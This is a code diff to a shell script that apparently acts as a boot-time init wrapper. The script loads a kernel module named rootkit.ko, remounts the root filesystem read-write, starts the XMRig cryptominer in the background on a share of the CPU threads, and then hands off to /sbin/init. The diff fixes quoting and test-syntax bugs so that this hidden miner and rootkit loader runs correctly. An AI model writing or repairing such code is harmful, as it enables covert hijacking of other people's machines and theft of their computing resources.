@@ -12,14 +12,14 @@ module_dir="/lib/modules/$(uname -r)/extra"
 
 xmrig_dir="/opt/xmrig/"
 xmrig_binary="$xmrig_dir/xmrig"
-xmrig_config="xmrig_dir/config.json"
-
+xmrig_config="$xmrig_dir/config.json"
+mount -o remount,rw /
 #compile rootkit
 
 #if extra not real then create it
 #copy compile rootkit.ko to destination
-if [! -d $module_dir]; then
-	mkdir "$module_dir"
+if [ ! -d "$module_dir"]; then
+	mkdir -p "$module_dir"
 fi
 
 cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
@@ -28,11 +28,11 @@ insmod "$module_dir/rootkit.ko"
 
 threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
 #check if min number of threads is six
-if [$threads -gt 6]
+if [ "$threads" -gt 6 ]
 	#check if we got xmrig and if not then wget xmrig
 
 	usable_threads=$((threads*20/100))
-	$xmrig_binary --config=$xmrig_config --threads=$usable_threads &
+	"$xmrig_binary" --config="$xmrig_config" --threads="$usable_threads" &
 fi
 
 exec /sbin/init "$@"
